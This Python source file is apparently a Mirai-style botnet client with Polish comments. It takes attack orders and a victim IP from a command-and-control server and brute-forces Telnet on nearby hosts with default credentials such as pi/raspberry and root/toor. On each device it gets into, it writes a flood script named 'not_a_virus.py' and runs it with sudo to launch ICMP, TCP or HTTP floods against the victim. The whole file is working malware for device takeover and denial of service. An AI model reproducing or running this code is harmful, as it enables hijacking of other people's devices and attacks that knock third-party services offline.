import socket
import time
import telnetlib
from _thread import start_new_thread

attack = False
attack_type = ''


def telnetConnect(ip_address, victimIP, attackType):
    # można zrobić pętlę do wczytywania user credentials z pliku
    users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
    passwords = ['Ciumcium', 'toor', 'admin', 'root', 'user', 'raspberry']

    for user in users:
        print('connecting with login: ' + user)
        for password in passwords:
            time.sleep(10)
            if not attack:
                print("telnet return")

            try:
                tn = telnetlib.Telnet(ip_address, port=23)

            except:
                # if ip_addres does not respond return
                return

            # print(' and passwd: ' + password)
            try:
                tn.read_until(b"login: ")
                tn.write(user.encode('ascii') + b"\n")
                if password:
                    tn.read_until(b"Password: ")
                    tn.write(password.encode('ascii') + b"\n")
            except EOFError:
                print("error")
                tn.close()
                continue

            print("attacktype= " + str(attackType))

            if attackType == '1':  # note
                print('pingujemy..')
                bfile = bytes(victimIP.encode())
                tn.write(b"ping"+ bfile + b"\n")
                if not attack:
                    print("stopping attack")
                    return
                time.sleep(60)

                # file = open('icmp_flood_code.txt', 'r')
                # str1 = file.read()
                # print(tn.write(b"touch Not_A_VirusICMP.py"))
                # print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'Not_A_VirusICMP.py', encoding="ascii")))
                # print(tn.write(b"python Not_A_VirusICMP.py"))
                # file.close()

                if not attack:
                    # print(tn.write(b"exit"))
                    tn.write(telnetlib.IP)
                    return

                tn.write(b"exit\n")

                # print(tn.read_all().decode('ascii'))

            if attackType == '2':
                file = open('tcp_flood_code.txt', 'r')
                strr = file.read()
                newstr = strr.replace("destination_ip", victimIP)
                str1 = newstr.replace('destination_port', '80')
                file.close()

                bfile = bytes(str1.encode())
                tn.write(b"rm not_a_virus.py\n")
                tn.write(b"touch not_a_virus.py\n")
                tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus.py' + b'\n')
                tn.write(b"sudo python not_a_virus.py\n")
                tn.write(b"ls\n")
                time.sleep(10)
                tn.write(b"exit\n")
                if not attack:
                    print(tn.write(b"exit"))
                    tn.write(telnetlib.IP)
                    return
                print(tn.read_until(b"exit").decode('ascii'))
                tn.write(b"exit\n")
                return

            if attackType == '3':
                file = open('http_flood.txt', 'r')
                strr = file.read()
                newstrr = strr.replace("destination_host", 'none')
                # newstr = newstrr.replace("destination_ip", '213.180.147.154')
                newstr = newstrr.replace("destination_ip", victimIP)
                str1 = newstr.replace('666', '443')
                file.close()

                bfile = bytes(str1.encode())
                tn.write(b"rm not_a_virus_http.py\n")
                tn.write(b"touch not_a_virus_http.py\n")
                tn.write(b'echo ' + b'"' + bfile + b'"' + b'>>' + b'not_a_virus_http.py' + b'\n')
                tn.write(b"sudo python3 not_a_virus_http.py\n")
                time.sleep(60)
                tn.write(b"sudo python3 not_a_virus_http.py\n")
                time.sleep(60)
                tn.write(b"ls\n")
                tn.write(b"exit \n")

                if not attack:
                    print(tn.write(b"exit"))
                    tn.write(telnetlib.IP)
                    return
                print(tn.read_until(b"exit").decode('ascii'))
                tn.write(b"exit\n")
                return

            tn.close()
    print("telnet is done")
    # t.close()


def checkForOtherDevices(ip, victimIP):
    x = 2
    l = len(ip)
    g = ip.split('.')[-1]
    ip = ip[:l - len(g)]
    print('connecting to telnet...')
    start_new_thread(telnetConnect, ("192.168.100.8", victimIP, attack_type))
    while x < 20:
        if not attack:
            break
        current_address = ip + str(x)
        # próbuj połączyć z każdym przez telnet
        print(current_address)
        start_new_thread(telnetConnect, (current_address, victimIP, attack_type))
        x += 1

    print('finished')


if __name__ == '__main__':

    # HOST = '192.168.100.11'  # The server's hostname or IP address
    HOST = '192.168.100.7'
    h=HOST
    PORT = 65432  # The port used by the server

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        connected = 0
        while True:
            print('test3')
            # connected == 1 -> bot is connected
            # connected == 0 -> bot is disconnected
            if connected == 1:
                continue
            print('test')
            while connected == 0:
                time.sleep(0.5)
                try:
                    print('trying to connect... ')
                    s.connect((HOST, PORT))
                    # send info to server that a bot is connected
                    s.send('1'.encode())
                    connected = 1
                except:
                    print("couldn't connect to: " + HOST)
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    connected = 0
                    continue
                time.sleep(1)
                print("Connection established!")
            try:
                data = str(s.recv(1).decode())
                if data is None:
                    connected = 2
                    continue
                else:
                    connected = 1
                print('Received', str(data))
                if data == '1' or data == '2' or data == '3':
                    attack_type = data
                    victimIP = str(s.recv(16).decode())
                    print('victim address:' + str(victimIP))
                    attack = True
                    checkForOtherDevices(HOST, victimIP)

                else:
                    print('something went wrong')

                stop = str(s.recv(1).decode())
                if stop == '0':
                    attack = False
                    print("Stopping")
                    HOST = str(s.recv(16).decode())
                    s.connect((h, PORT))
                    s.close()
                    s.detach()

                    connected = 0
                    print('test2')

                time.sleep(5)
            except:
                connected = 0
